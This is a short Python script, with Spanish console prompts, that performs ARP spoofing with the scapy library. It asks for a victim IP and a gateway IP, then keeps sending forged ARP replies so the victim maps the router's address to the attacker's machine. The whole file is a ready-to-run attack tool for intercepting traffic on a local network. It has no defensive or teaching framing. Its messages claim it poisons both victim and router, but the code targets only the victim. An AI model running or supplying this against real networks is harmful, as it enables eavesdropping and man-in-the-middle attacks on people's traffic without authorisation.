from scapy.all import ARP, send
from time import sleep
from sys import exit

def main():
    print("ARP Spoofing")
    print("Su objetivo es hacer creer a la víctima que usted es el router, y al router que usted es la víctima")
    print("Para ello, se enviarán paquetes ARP falsos a la víctima y al router")
    print("Para detener el ataque, presione Ctrl+C")
    print("Ingrese los datos solicitados a continuación")
    ip = input("IP objetivo: ")
    gateway = input("IP del gateway(router): ")
    interface="eth0"
    print("Iniciando ARP Spoofing...", end="\n\n")
    try:
        while True:
            arp_response = ARP(
                pdst=ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway, op='is-at')
            # Paquete ARP para la víctima
            send(arp_response, verbose=0)
            sleep(2)
    except KeyboardInterrupt:
        print("ARP Spoofing detenido por el usuario")
        exit(0)


if __name__ == "__main__":
    main()
